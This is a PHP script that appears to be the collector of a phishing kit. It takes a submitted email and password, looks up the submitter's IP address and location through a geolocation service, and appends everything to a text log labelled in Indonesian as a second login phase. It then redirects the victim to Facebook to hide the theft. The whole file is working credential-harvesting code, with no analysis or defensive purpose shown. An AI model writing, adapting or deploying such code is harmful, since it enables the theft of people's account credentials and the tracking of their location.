<?php
$file = "___________martampilanmarbarulaginyaha___________.txt";
$email = $_POST['emphonping'];
$pass = $_POST['pasping'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = "http://www.geoplugin.net/php.gp?ip=$ip";
$response = fetch($host);
$data = unserialize($response);
$a = $data['geoplugin_city'];
$b = $data['geoplugin_region'];
$c = $data['geoplugin_countryName'];

function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "__________________________________________________________________");
fwrite($handle, "\n");
fwrite($handle, "LOGIN FASE 2");
fwrite($handle, "\n");
fwrite($handle, "•  EMAIL     :   ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "•  PASSWORD  :   ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "========= INFO IP : ");
fwrite($handle, "$ip ");
fwrite($handle, "\n");
fwrite($handle, "•  NEGARA    :   ");
fwrite($handle, "$c");
fwrite($handle, "\n");
fwrite($handle, "•  PROVINSI  :   ");
fwrite($handle, "$b");
fwrite($handle, "\n");
fwrite($handle, "•  KOTA      :   ");
fwrite($handle, "$a");
fwrite($handle, "\n");
fclose($handle);
echo "<script images=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com/\";
// -->
</script>";
?>

